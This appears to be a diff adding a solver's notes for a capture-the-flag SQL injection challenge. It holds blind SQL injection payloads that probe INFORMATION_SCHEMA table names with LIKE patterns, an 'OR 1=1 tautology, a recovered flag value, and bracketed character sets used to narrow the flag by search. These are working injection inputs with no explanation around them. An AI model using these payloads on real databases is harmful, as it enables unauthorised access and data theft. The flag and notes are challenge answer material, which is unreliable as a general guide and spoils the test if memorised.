@@ -1,0 +1,11 @@
+'OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE 'flag{w3lc0me\_t0_th3\_m3m3side%}') AND ''='
+'OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%1%') AND ''='
+
+'OR 1=1 AND ''='
+flag{acdefghilmstw03}
+[acdefgh]
+[acde][fgh]
+
+
+[ilmstw03]
+[ilms][tw03]
